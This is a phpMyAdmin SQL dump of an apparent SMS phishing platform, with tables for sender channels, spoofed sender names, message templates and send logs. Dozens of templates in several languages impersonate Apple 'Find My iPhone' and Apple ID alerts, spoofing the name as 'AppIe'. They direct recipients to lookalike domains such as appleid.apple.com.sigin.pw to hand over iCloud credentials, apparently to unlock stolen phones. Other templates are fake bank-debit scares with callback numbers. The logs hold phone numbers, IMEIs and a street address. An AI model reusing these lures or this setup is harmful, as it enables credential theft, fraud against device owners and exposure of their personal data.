-- phpMyAdmin SQL Dump
-- version 4.7.7
-- https://www.phpmyadmin.net/
--
-- Хост: 127.0.0.1:3306
-- Время создания: Июн 12 2018 г., 02:03
-- Версия сервера: 5.6.38
-- Версия PHP: 5.6.32

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База данных: `db_sms`
--

-- --------------------------------------------------------

--
-- Структура таблицы `channels2`
--

CREATE TABLE `channels2` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `type` int(11) NOT NULL,
  `login` text NOT NULL,
  `password` text NOT NULL,
  `activate` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `channels2`
--

INSERT INTO `channels2` (`id`, `name`, `type`, `login`, `password`, `activate`) VALUES
(10, 'russiaru по РФ белое', 0, 'user_name', 'password', 1),
(12, 'vmc2 по снг', 0, 'user_name', 'password', 1);

-- --------------------------------------------------------

--
-- Структура таблицы `icloud_directory`
--

CREATE TABLE `icloud_directory` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `count` int(11) NOT NULL,
  `custom` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `icloud_directory`
--

INSERT INTO `icloud_directory` (`id`, `name`, `count`, `custom`) VALUES
(3, 'РФ', 8, 0),
(5, 'АНГЛ', 3, 0),
(8, 'италия', 1, 0),
(9, 'германия', 1, 0),
(10, 'ФРАНЦИЯ', 0, 0);

-- --------------------------------------------------------

--
-- Структура таблицы `icloud_templates`
--

CREATE TABLE `icloud_templates` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `text` text NOT NULL,
  `time_format` int(11) NOT NULL,
  `activate` int(11) NOT NULL,
  `directory` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `icloud_templates`
--

INSERT INTO `icloud_templates` (`id`, `name`, `text`, `time_format`, `activate`, `directory`) VALUES
(39, 'ТЕСТ ЛИНКА', 'iP: {link}{imei} .Ap', 1, 1, 0),
(145, 'ТЕСТ РУСК', '«Find My iPhone»: \r\niPhone  {iphone} был {timeFind}. \r\nПосм: {link}{imei} .\r\nApple', 0, 0, 0),
(123, 'НЕМЕЦКОЕ ГЕО СОКРАЩ', 'Find My iPhone: \r\nIhres verlorenen  iPhone {iphone} wurde angeschlossen .\r\nAktuelle Geoposition: {link}{imei} .\r\nApple.', 0, 0, 9),
(300, 'ФОТО РУСК', 'Автоматическое сообщение\"iCloud.com\":\r\n{timeFind}, Камера устройства\r\nModel: {iphone}\r\nIMEI: {imei}\r\nСоздание, сохранение фото в разделе «Фото iCloud»\r\nПросмотр снимков: ({link}{imei}).\r\n© AppIe Inc.', 0, 0, 3),
(125, 'НЕМЕЦК ГЕО С АДРЕСОМ', 'Notifikation «Find My iPhone»: \r\nIhres verlorenes iPhone {iphone} wurde unter folgender Adresse gefunden {custom1} {timeFind}. \r\nAktuelle Geoposition: {link}{imei} .\r\nApple ', 0, 0, 9),
(236, 'ЛОКАЦ АНГЛ СОКРАЩ', '\"Find My iPhone\":\r\nYour lost iPhone {iphone} has been found.\r\nTo view Location:({link}{imei}).\r\nApple.', 0, 0, 5),
(93, 'qwe', 'wqe', 0, 0, 1),
(91, 'ИТАЛИЯ ГЕО', 'Notifica «Find My iPhone»: \r\nIl vostro perso iPhone {iphone} è stato collegato alla ret {timeFind}. \r\nInformazioni sull\'ultima posizione del Vostro iPhone sarà disponibile entro 24 ore! \r\nVedere gps: {link}{imei} . \r\nApple ', 0, 0, 8),
(319, 'НЕМЕЦК ГЕО 1', '«Find My iPhone»:\r\niPhone {iphone} wurde angeschlossen {timeFind}.\r\nDer Letzte Standort Ihres iPhone wird innerhalb von 24 Stunden verfügbar sein!\r\nAktuelle Geoposition: ({link}{imei}).\r\nApple', 0, 0, 9),
(330, 'АНГЛ ГЕО ПОДКЛ К СЕТИ 1', '«Find My iPhone»:\r\niPhone {iphone} has been connected to the network at {timeFind}.\r\nTo view last known location on: ({link}{imei}).\r\n© AppIe Inc.', 0, 0, 5),
(231, 'АНГЛ СЕРВИС', '\"Find My iPhone\":\r\niPhone {iphone} has been found and transferred to Apple service center.\r\nTo verify ownership of the device and return back iPhone on: ({link}{imei}) .\r\nApple', 0, 0, 5),
(173, 'фр,подключение к сети', '\"Find My iPhone\": \r\nVotre perdu iPhone {iphone} a été connecté à {timeFind}. \r\nVoir la dernière position: {link}{imei} .\r\nApple', 0, 0, 10),
(314, 'ТЕСТ РУССК 2 смс', '«Find My iPhone»: \r\niPhone  {iphone} был {timeFind}. \r\nПосм: http://{link}{imei} .\r\nAppIe', 0, 0, 3),
(254, 'АНГЛ БЛОК', 'Notification from «Support Apple»:\r\nSigned in to Apple ID {mask} from IP address: 66.102.9.67.\r\nWas recorded the attempt to unlock the \"Lost Mode\" of iPhone {iphone};\r\nIMEI: {imei};\r\nNeed to sign in and verify ownership of the account and the device  within 24 h.: ({link}{imei}).\r\nOtherwise, your Apple ID account will be blocked!\r\n© Apple Inc.', 0, 0, 5),
(375, 'СЕРВИС 2 сложное фми на англ', '«Find My iPhone»:\r\niPhone {iphone} IMEI {imei} поступил в сервисный центр AppIe.\r\n«iPhone» числится утерянным!\r\nОтправьте заявку на возврат Вашего iPhone через приложение «найти iPhone» по ссылке:({link}{imei}).\r\nAppIe', 0, 0, 3),
(378, 'СООБЩЕНИЕ 1 отправка С ГЕО', '«Find My iPhone»:\r\n«iPhone» был подключён к сети {timeFind}. \r\nОтправить сообщение на утерянное устройство и посмотреть последнее местоположение Вашего iPhone на: ({link}{imei}).\r\n© AppIe Inc.', 0, 0, 3),
(340, 'СБРОС ПАРОЛЯ 1', 'Выполнен вход в AppIe ID {mask} с IP-адреса: 66.102.9.67.\r\nДата и время: {timeFind}\r\nЕсли Вы не входили в iCIoud и считаете, что кто-то другой мог получить доступ к Вашей учетной записи, необходимо как можно скорее сбросить пароль на сайте управления AppIe ID ({link}{imei}).\r\nС уважением,	\r\nСлужба поддержки appIe', 0, 0, 3),
(304, 'ТЕСТ РУССК 1 СМС', '«Find My iPhone»: iPhone  http://http://icloud.com.fi/3557.AppIe', 0, 0, 3),
(367, 'БЛОК РУС 2 УЖЕ БЛОК', 'Выполнена попытка некорректного стирания iPhone {iphone}.\r\nВ целях безопасности аккаунт был заблокирован!\r\nВы можете разблокировать свою учетную запись на сайте управления AppIe ID {link}{imei} .\r\nСлужба поддержки appIe', 0, 0, 3),
(379, 'ГЕО ФМИ РУССКИЙ', '«Find My iPhone»:\r\n«iPhone» был подключён к сети {timeFind}.\r\nИнформация о последнем местоположении Вашего iPhone будет доступна в течение 24 часов!\r\nПосмотреть геопозицию на:({link}{imei}).\r\n© AppIe Inc.', 0, 0, 3),
(385, 'ОТКЛЮЧЕНИИ ФМИ 2 коротк', 'Функция «Найти iPhone» отключена на iPhone {iphone}.\r\nУстройство нельзя будет обнаружить, перевести в режим пропажи.Возможны повторная активация и использование iPhone посторонними лицами без запроса пароля.\r\nАктивация функции «Найти iPhone» на сайте AppIe ID ﻿({link}{imei}).\r\nС уважением,	\r\nСлужба поддержки appIe', 0, 0, 3),
(376, 'СЕРВИС 1 сложное БЕЗ ФМИ', 'iPhone {iphone} IMEI {imei} поступил в сервисный центр AppIe.\r\n«iPhone» числится утерянным!\r\nОтправьте заявку на возврат Вашего iPhone через приложение «найти iPhone» по ссылке:({link}{imei}).\r\nAppIe', 0, 0, 3),
(358, 'ГЕО-2  С АДРЕСОМ с ФМИ НА АНГЛИЙСКОМ', '«Find My iPhone»:\r\n«iPhone» был обнаружен по адресу {custom1} {timeFind}.\r\nИнформация о последнем местоположении Вашего iPhone будет доступна в течение 24 часов на:({link}{imei}).\r\nAppIe', 0, 0, 3),
(357, 'ГЕО-1 С АДРЕСОМ ФМИ НА РУССК', '«Найти iPhone»:\r\n«iPhone» был обнаружен по адресу {custom1} {timeFind}.\r\nИнформация о последнем местоположении Вашего iPhone будет доступна в течение 24 часов на:({link}{imei}).\r\nAppIe.', 0, 0, 3),
(382, 'ОТКЛЮЧЕНИЕ ФМИ 1 ДЛИН', 'Функция «Найти iPhone» отключена на iPhone {iphone}.Устройство нельзя будет обнаружить, перевести в режим пропажи.Возможны активация и использование iPhone посторонними лицами без запроса пароля.Если действия выполнены не Вами, немедленно отмените отключение на сайте AppIe ID ({link}{imei}).\r\nС уважением,	\r\nСлужба поддержки appIe', 0, 0, 3),
(384, 'УДАЛЕНИЕ 1 РУСК', 'Выполнен вход в AppIe ID {mask} с IP-адреса: 66.102.9.67. \r\niPhone {iphone} удалён из учётной записи.\r\nУстройство невозможно будет обнаружить, перевести в режим пропажи.\r\nВозможны повторная активация и использование без пароля посторонними лицами.\r\nЕсли действия выполнены не Вами, немедленно отмените изменения на сайте AppIe ID ({link}{imei}).\r\nSupport AppIe ©.', 0, 0, 3),
(352, 'СООБЩЕНИЕ 2 С ГЕО.ОТ НАШЕДШ.', '«Find My iPhone»:\r\nУтерянный «iPhone» был подключен к сети {timeFind}.\r\nВам отправлено сообщение.\r\nПрочитать сообщение и посмотреть последнею геопозицию Вашего «iPhone» на:({link}{imei}).\r\n© AppIe Inc.', 0, 0, 3),
(320, 'АНГЛ СООБЩЕНИЕ2 от нашедш.', '«Find My iPhone»:\r\niPhone {iphone} has been found at {timeFind}.\r\nA message of returning «iPhone» has been sent to you. \r\nRead the message and To view last known location on: ({link}{imei}) .\r\nAppIe', 0, 0, 5),
(383, 'АНГЛ ОТКЛЮЧ ФМИ 1', 'Find My iPhone has been disabled on iPhone {iphone}.\r\nWith Find My iPhone disabled, this device can no longer be located, placed in Lost Mode.\r\nIn addition, your Apple ID and password will no longer be required for someone to erase, reactivate, and use your iPhone.\r\nIf this action is made not by you,need quickly sign in and will cancel a deactivation on: {link}{imei}.\r\nSupport AppIe ©.', 0, 0, 5),
(377, 'СЕРВИС 3 простое.фми англ', '«Find My iPhone»:\r\niPhone {iphone} IMEI {imei} поступил в сервисный центр AppIe.\r\nЕсли Вы являетесь владельцем устройства, отправьте заявку на возврат через приложение «найти iPhone» по ссылке:({link}{imei}).\r\nAppIe', 0, 0, 3),
(329, 'АНГЛ БЛОК С МАСКОЙ', 'Notification from «Support Apple»:\r\nWas recorded the attempt to unlock the \"Lost Mode\" of iPhone {iphone};\r\nIMEI {imei};\r\nApple ID {mask} .\r\nNeed to sign in and verify ownership of the account and the device  within 24 h. on: {link}{imei} .\r\nOtherwise, your Apple ID account will be blocked! \r\n© Apple Inc.', 0, 0, 5),
(366, 'БЛОК РУС 1 ПРЕДУПРЕЖДЕНИЕ', 'Выполнена попытка некорректного стирания iPhone {iphone}.Подтвердите право обладание учётной записью и устройством на сайте управления AppIe ID {link}{imei} .В случае не подтверждения, Ваш аккаунт будет заблокирован в целях безопасности!\r\nСлужба поддержки appIe\r\n', 0, 0, 3);

-- --------------------------------------------------------

--
-- Структура таблицы `log2`
--

CREATE TABLE `log2` (
  `id` int(11) NOT NULL,
  `key` varchar(100) NOT NULL,
  `count` int(11) NOT NULL,
  `sender` varchar(30) CHARACTER SET utf32 NOT NULL,
  `message` varchar(500) NOT NULL,
  `type` int(11) NOT NULL,
  `messageType` text NOT NULL,
  `timeToSend` int(11) NOT NULL,
  `status` varchar(11) NOT NULL,
  `dlr_status` varchar(20) NOT NULL,
  `dlr_errors` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `log2`
--

INSERT INTO `log2` (`id`, `key`, `count`, `sender`, `message`, `type`, `messageType`, `timeToSend`, `status`, `dlr_status`, `dlr_errors`) VALUES
(2299, '67b04b8ade1ab8b274f741b05712c357', 0, 'iCloud', '«Find My iPhone»: \r\nВаш утерянный iPhone 7 32GB Black был обнаружен по адресу Комендантский проспект 17 Санкт-Петербург Россия 197371 13.03.18/07:30 PST. \r\nИнформация о последнем местоположении Вашего iPhone будет доступна в течение 24 часов! \r\nПосмотреть геопозицию: icloud.com-findmf.info/355318082237261 . \r\nApple ', 10, '1', 0, '', '', 0),
(2409, 'a0d5c037cc7d859aaa4781329b05997b', 0, 'iCloud', '', 10, '1', 0, '', '', 0),
(2421, 'b86a2f2fff0e79ab57ce57517319f1e8', 0, 'iCloud', '«Find My iPhone»: \r\nВаш утерянный iPhone X 256GB Silver поступил в сервисный центр Apple. \r\nПодтвердите право собственности устройством и оформите заявку на возврат «iPhone»: ﻿﻿icloud.com-fmi.tech/353048095059566 .\r\nApple ', 10, '1', 0, '', '', 0),
(2468, '77943e28ee7ef7824bd9c33b8aa2f895', 0, 'iCloud', '', 1, '1', 0, '', '', 0),
(2534, '809971ccf7e8cb9fe9ec1c18e72c6acd', 0, 'iCloud', '', 10, '1', 0, '', '', 0),
(2657, '9dc66956b88bc5472fc2adf70586464c', 0, 'iCloud', '', 10, '1', 0, '', '', 0),
(2701, '789c1967fb65273b9cbe26af0dae6e5a', 0, 'iCloud', 'iP: http://icloud.com.fmi-id.tech/353332077845196 .Ap', 1, '0', 0, '', '', 0),
(3053, 'ba99221e791534d8be83c0ef4f7ba1ec', 0, 'iCloud', 'Выполнен вход в AppIe ID  с IP-адреса: 66.102.9.67.\r\nЗафиксирована попытка некорректного стирания устройства:\r\niPhone 7 Plus 128GB Rose Gold.\r\nПодтвердите право обладание учётной записью и устройством в управление учетной записью Apple:(http://appleid.apple.com.sigin.pw/356565080169032).\r\nВ случае не подтверждения Ваш Apple ID будет заблокирован в целях безопасности!\r\n© Apple Inc.', 10, '1', 0, '', '', 0),
(3062, '82642702ded4e2fdf0a25856379f8dca', 0, 'iCloud', '«Find My iPhone»:\r\niPhone 7 256GB Black был подключён к сети 09.05.18/04:45 PST. \r\nОтправить сообщение о возврате Вашего iPhone и посмотреть последнею геопозицию на:(http://icloud.com.findfmi.fun/355317083078302).\r\nAppIe', 10, '1', 0, '', '', 0),
(3144, '2a378c8dddb03508e64e1d10efe08b50', 0, 'iCloud', '«Find My iPhone»:\r\niPhone 8 Plus 64GB поступил в сервисный центр Apple.\r\nПодтвердите право собственности устройством и оформите заявку на возврат Вашего «iPhone» на:(http://icloud.com.findfmi.fun/354833090153830).\r\nAppIe', 10, '1', 0, '', '', 0),
(3153, 'ced20b0d0a68296caaffc5c7b30a7462', 0, 'iCloud', '«Find My iPhone»:\r\niPhone 5S 16GB Space Grey был подключён к сети 16.05.18/00:18 PST. \r\nОтправить сообщение о возврате Вашего iPhone и посмотреть последнею геопозицию на:(http://icloud.com.findfmi.fun/013882005557463).\r\nAppIe', 10, '1', 0, '', '', 0),
(3197, '6f56c911fc088e1d5699d3d54fab714b', 0, 'iCloud', '«Find My iPhone»:\r\niPhone 7 32GB Black IMEI 356558087172356 поступил в сервисный центр Apple.\r\nПодтвердите право собственности устройством и оформите заявку на возврат Вашего «iPhone» на:(http://icloud.com.findfmi.fun/356558087172356).\r\nAppIe', 10, '1', 0, '', '', 0),
(3234, '62b7d438b1c3a8b7955edd0c9ee68e13', 0, 'iCloud', '', 13, '1', 0, '', '', 0),
(3424, '6b1be3909f7b79c3cc01a8a66f736f23', 0, 'iCloud', '«Find My iPhone»:\r\niPhone 8 Plus 256GB Space Gray был подключён к сети 05.06.18/01:45 PST. \r\nОтправить сообщение о возврате Вашего «iPhone» и посмотреть последнею геопозицию на:(http://icloud.com.inlogin.info/356770088237514).\r\n© AppIe Inc.', 16, '1', 0, '', '', 0),
(3548, '47d2099f2ab50fb9abc160e876ce085a', 0, '123', 'textMessage2', 10, '0', 0, '', '', 0),
(3549, '20682d3bcf170afcfee72f9aa82e5184', 0, 'iCloud', 'iP: icloud.com-fmi.net/?auth=353311078258807 .Ap', 10, '0', 0, '', '', 0),
(3550, 'c1eeb242cda64c9f665d235cd3aaad5d', 0, 'iCloud', '«Find My iPhone»: \r\niPhone  6S 16GB Space Grey был 12.06.18/00:41. \r\nПосм: icloud.com-fmi.net/?auth=353311078258807 .\r\nApple', 10, '0', 0, '', '', 0),
(3551, '60288033f172a9f708dec556b90b9b71', 0, 'iCloud', 'iP: icloud.com-fmi.net/?auth=353311078258807 .Ap', 10, '0', 0, '', '', 0),
(3552, 'c52fc7be79f7ec6a7936271648d25fe8', 0, 'online', 'Hi, there my second message for example', 10, '0', 0, '', '', 0),
(3553, '71f5cb653550e33898a1e0010a9aa190', 0, 'ServINFO', 'Hi, there my second message for example', 10, '0', 0, '', '', 0),
(3554, 'e67a49f7bbf563012d6b5be380bba7d8', 2, 'onlineSB', 'Hi, there my second message for example', 10, '0', 1528758134, '1703', '', 0),
(3555, '52db53b249644edceae27150e987d84f', 2, 'iCloud', '«Find My iPhone»: \r\niPhone  7 32GB Space Grey был 12.06.18/01:55. \r\nПосм: mysite2.com/?auth=353311033338807 .\r\nApple', 10, '0', 1528758135, '1703', '', 0),
(3556, '0a121322f214f69ed3f11020482875a6', 0, 'onlineSB', 'Hi, there my second message for example', 10, '0', 0, '', '', 0),
(3557, '7fb9b5d4b28b05d71b69bec12e0456b8', 0, 'iCloud', '«Find My iPhone»: \r\niPhone  7 32GB Space Grey был 12.06.18/02:03. \r\nПосм: mysite2.com/?auth=353311033338807 .\r\nApple', 10, '0', 0, '', '', 0);

-- --------------------------------------------------------

--
-- Структура таблицы `log2_full`
--

CREATE TABLE `log2_full` (
  `id` int(11) NOT NULL,
  `key` varchar(100) NOT NULL,
  `number` varchar(20) NOT NULL,
  `timeToSend` int(11) NOT NULL,
  `status` varchar(500) NOT NULL,
  `dlr_id` varchar(50) NOT NULL,
  `dlr_status` varchar(20) NOT NULL,
  `dlr_time` varchar(100) NOT NULL,
  `message` text NOT NULL,
  `name` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `log2_full`
--

INSERT INTO `log2_full` (`id`, `key`, `number`, `timeToSend`, `status`, `dlr_id`, `dlr_status`, `dlr_time`, `message`, `name`) VALUES
(4513, 'e67a49f7bbf563012d6b5be380bba7d8', '79639052586', 1528758093, '1703', '', '', '', 'Hi, there my message for example\r', 'onlineSB'),
(4514, 'e67a49f7bbf563012d6b5be380bba7d8', '79639052586', 1528758134, '1703', '', '', '', 'Hi, there my second message for example', 'onlineSB'),
(4515, '52db53b249644edceae27150e987d84f', '79150765756', 1528758135, '1703', '', '', '', '«Find My iPhone»: \r\niPhone  6S 16GB Space Grey был 12.06.18/01:55. \r\nПосм: mysite.com/?example=353311078258807 .\r\nApple', 'FMI\r'),
(4516, '52db53b249644edceae27150e987d84f', '79150763333', 1528758135, '1703', '', '', '', '«Find My iPhone»: \r\niPhone  7 32GB Space Grey был 12.06.18/01:55. \r\nПосм: mysite2.com/?auth=353311033338807 .\r\nApple', 'Test');

--
-- Триггеры `log2_full`
--
DELIMITER $$
CREATE TRIGGER `update log2 and delete form pending2_full` AFTER INSERT ON `log2_full` FOR EACH ROW BEGIN
UPDATE `log2` SET `count` = `count` + 1, `timeToSend` = NEW.`timeToSend`, `status` = NEW.`status` WHERE `key` = NEW.`key`;
DELETE FROM `pending2_full` WHERE `key` = NEW.`key` AND `number` = NEW.`number` LIMIT 1;
SET @countNumbers = (SELECT `count_numbers` FROM `pending2` WHERE `key` = NEW.`key`);
IF (@countNumbers = 0) THEN 
	DELETE FROM `pending2` WHERE `key` = NEW.`key`; 
END IF;
END
$$
DELIMITER ;

-- --------------------------------------------------------

--
-- Структура таблицы `pending2`
--

CREATE TABLE `pending2` (
  `id` int(11) NOT NULL,
  `key` varchar(100) NOT NULL,
  `sender` varchar(30) NOT NULL,
  `count_sms` int(11) NOT NULL,
  `count_numbers` int(11) NOT NULL,
  `message` varchar(500) NOT NULL,
  `type` int(11) NOT NULL,
  `messageType` int(11) NOT NULL,
  `perHours` int(2) NOT NULL,
  `perMinutes` int(2) NOT NULL,
  `perAmount` int(11) NOT NULL,
  `planDate` date NOT NULL,
  `planHours` int(2) NOT NULL,
  `planMinutes` int(2) NOT NULL,
  `timeToSend` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `createTime` int(255) NOT NULL,
  `pauseTime` int(255) NOT NULL,
  `end` int(255) NOT NULL,
  `dlr_errors` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `pending2`
--

INSERT INTO `pending2` (`id`, `key`, `sender`, `count_sms`, `count_numbers`, `message`, `type`, `messageType`, `perHours`, `perMinutes`, `perAmount`, `planDate`, `planHours`, `planMinutes`, `timeToSend`, `status`, `createTime`, `pauseTime`, `end`, `dlr_errors`) VALUES
(9, '0a121322f214f69ed3f11020482875a6', 'onlineSB', 2, 2, 'Hi, there my second message for example', 10, 0, 0, 0, 0, '0000-00-00', 0, 0, 1528758201, 1, 1528758201, 0, 1528758201, 0),
(10, '7fb9b5d4b28b05d71b69bec12e0456b8', 'iCloud', 2, 2, '«Find My iPhone»: \r\niPhone  7 32GB Space Grey был 12.06.18/02:03. \r\nПосм: mysite2.com/?auth=353311033338807 .\r\nApple', 10, 0, 0, 0, 0, '0000-00-00', 0, 0, 1528758214, 1, 1528758214, 0, 1528758214, 0);

--
-- Триггеры `pending2`
--
DELIMITER $$
CREATE TRIGGER `insertToSend` BEFORE UPDATE ON `pending2` FOR EACH ROW BEGIN
SET @timeToSend=(SELECT `timeToSend` FROM `pending2_full` WHERE `key`=NEW.`key` ORDER BY `id` ASC LIMIT 1);
SET @endSend=(SELECT `timeToSend` FROM `pending2_full` WHERE `key`=NEW.`key` ORDER BY `id` DESC LIMIT 1);
SET NEW.`timeToSend`=@timeToSend;
SET NEW.`end`=@endSend;
END
$$
DELIMITER ;

-- --------------------------------------------------------

--
-- Структура таблицы `pending2_full`
--

CREATE TABLE `pending2_full` (
  `id` int(11) NOT NULL,
  `key` varchar(100) NOT NULL,
  `number` varchar(20) NOT NULL,
  `timeToSend` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `message` text NOT NULL,
  `name` text NOT NULL,
  `i_imei` text NOT NULL,
  `i_iphone` text NOT NULL,
  `i_timeFind` text NOT NULL,
  `i_link` text NOT NULL,
  `i_mask` text NOT NULL,
  `i_custom1` text NOT NULL,
  `i_custom2` text NOT NULL,
  `i_custom3` text NOT NULL,
  `i_timeFormat` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `pending2_full`
--

INSERT INTO `pending2_full` (`id`, `key`, `number`, `timeToSend`, `status`, `message`, `name`, `i_imei`, `i_iphone`, `i_timeFind`, `i_link`, `i_mask`, `i_custom1`, `i_custom2`, `i_custom3`, `i_timeFormat`) VALUES
(14, '0a121322f214f69ed3f11020482875a6', '79639052586', 1528758201, 1, 'Hi, there my message for example\r', 'onlineSB', '', '', '', '', '', '', '', '', ''),
(15, '0a121322f214f69ed3f11020482875a6', '79639052586', 1528758201, 1, 'Hi, there my second message for example', 'onlineSB', '', '', '', '', '', '', '', '', ''),
(16, '7fb9b5d4b28b05d71b69bec12e0456b8', '79150765756', 1528758214, 1, '«Find My iPhone»: \r\niPhone  6S 16GB Space Grey был 12.06.18/02:03. \r\nПосм: mysite.com/?example=353311078258807 .\r\nApple', 'FMI\r', '', '', '', '', '', '', '', '', ''),
(17, '7fb9b5d4b28b05d71b69bec12e0456b8', '79150763333', 1528758214, 1, '«Find My iPhone»: \r\niPhone  7 32GB Space Grey был 12.06.18/02:03. \r\nПосм: mysite2.com/?auth=353311033338807 .\r\nApple', 'Test', '', '', '', '', '', '', '', '', '');

--
-- Триггеры `pending2_full`
--
DELIMITER $$
CREATE TRIGGER `updatepending2` AFTER DELETE ON `pending2_full` FOR EACH ROW BEGIN
SET @timeToSend=(SELECT `timeToSend` FROM `pending2_full` WHERE `key`=OLD.`key` ORDER BY `id` ASC LIMIT 1);
SET @endSend=(SELECT `timeToSend` FROM `pending2_full` WHERE `key`=OLD.`key` ORDER BY `id` DESC LIMIT 1);
SET @countNumbers = (SELECT COUNT(*) FROM `pending2_full` WHERE `key`=OLD.`key`);
SET @countNumbersOLD = (SELECT `count_numbers` FROM `pending2` WHERE `key`=OLD.`key`);
SET @countSMSOLD = (SELECT `count_sms` FROM `pending2` WHERE `key`=OLD.`key`);
SET @multipler = @countSMSOLD / @countNumbersOLD;
SET @countSMS = @multipler * @countNumbers;
IF (@countNumbers <> 0) THEN
UPDATE `pending2` SET `timeToSend`=@timeToSend, `end`=@endSend, `count_numbers`=@countNumbers, `count_sms`=@countSMS WHERE `key`=OLD.`key`;
ELSE 
DELETE FROM `pending2` WHERE `key`=OLD.`key`;
END IF;
END
$$
DELIMITER ;

-- --------------------------------------------------------

--
-- Структура таблицы `templates2`
--

CREATE TABLE `templates2` (
  `id` int(11) NOT NULL,
  `type` int(11) NOT NULL,
  `text` varchar(500) NOT NULL,
  `name` varchar(500) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

--
-- Дамп данных таблицы `templates2`
--

INSERT INTO `templates2` (`id`, `type`, `text`, `name`) VALUES
(1, 1, '0', 'onlineSB'),
(2, 2, 'Операция на сумму 16237RUB прошла успешно.Инфо:  8-800-555-8724', 'вас иван операция'),
(29, 1, '0', 'verify '),
(5, 1, '0', 'FindMyPhone'),
(21, 1, '0', 'rapida'),
(23, 2, 'Спасибо за регистрацию rapida-online.www.rapida.ru', 'рапида регистрация'),
(38, 2, 'Ваш персональный логин для пополнения 410014391002876. Провайдер Яндекс. Никому его не сообщайте!', 'рапида логин'),
(49, 1, '0', 'ServINFO'),
(48, 2, 'Posta Express Info: D-stra aveti pentru primire Scrisoare Recomandata BA138  din 15.06. Infoline(8.00-21.00): +436708097122;+436708097125', 'почта'),
(46, 2, 'пер', 'Posta Express Info: D-stra aveti pentru primire Scrisoare Recomandata BA138  din 15.06. Infoline(8.00-21.00): +436708097122;+436708097125'),
(33, 1, '0', 'FMI '),
(34, 2, 'Уведомление \"Найти FindMyPhone\"\n\nBаш iPhone 6 Gold 64GB был обнаружен сегодня в 13:41, 22  Июня 2016.\n\nИнформация о последнем местоположении Вашего iPhone 6 будет доступна в течение 24 часов по адресу applecloud.us.com \n\nЭто автоматическое сообщение от Apple?', 'айфон'),
(32, 2, 'Списание на сумму 16237RUB прошло успешно.Справки:88005554809', 'ант списание'),
(37, 1, '0', 'MSG'),
(39, 1, '0', 'online'),
(36, 2, 'перезвони мне на этот номер 89081267315', 'тест '),
(45, 1, '0', 'PostaExp'),
(42, 2, 'Списание средств отказано! Срочно свяжитесь!88005556453', 'от тарух списание '),
(43, 1, '0', 'uBank'),
(44, 1, '0', 'pay'),
(50, 1, '0', 'CB RF'),
(51, 1, '0', 'vmc'),
(52, 1, '0', 'UkrPosta'),
(53, 1, '0', 'TelePay'),
(54, 1, '0', 'FiscServ');

--
-- Индексы сохранённых таблиц
--

--
-- Индексы таблицы `channels2`
--
ALTER TABLE `channels2`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `icloud_directory`
--
ALTER TABLE `icloud_directory`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `icloud_templates`
--
ALTER TABLE `icloud_templates`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `log2`
--
ALTER TABLE `log2`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `key` (`key`);

--
-- Индексы таблицы `log2_full`
--
ALTER TABLE `log2_full`
  ADD PRIMARY KEY (`id`),
  ADD KEY `key` (`key`),
  ADD KEY `dlr_id` (`dlr_id`);

--
-- Индексы таблицы `pending2`
--
ALTER TABLE `pending2`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `key` (`key`),
  ADD KEY `key_2` (`key`);

--
-- Индексы таблицы `pending2_full`
--
ALTER TABLE `pending2_full`
  ADD PRIMARY KEY (`id`),
  ADD KEY `key` (`key`);

--
-- Индексы таблицы `templates2`
--
ALTER TABLE `templates2`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT для сохранённых таблиц
--

--
-- AUTO_INCREMENT для таблицы `channels2`
--
ALTER TABLE `channels2`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT для таблицы `icloud_directory`
--
ALTER TABLE `icloud_directory`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT для таблицы `icloud_templates`
--
ALTER TABLE `icloud_templates`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=386;

--
-- AUTO_INCREMENT для таблицы `log2`
--
ALTER TABLE `log2`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3558;

--
-- AUTO_INCREMENT для таблицы `log2_full`
--
ALTER TABLE `log2_full`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4517;

--
-- AUTO_INCREMENT для таблицы `pending2`
--
ALTER TABLE `pending2`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT для таблицы `pending2_full`
--
ALTER TABLE `pending2_full`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT для таблицы `templates2`
--
ALTER TABLE `templates2`
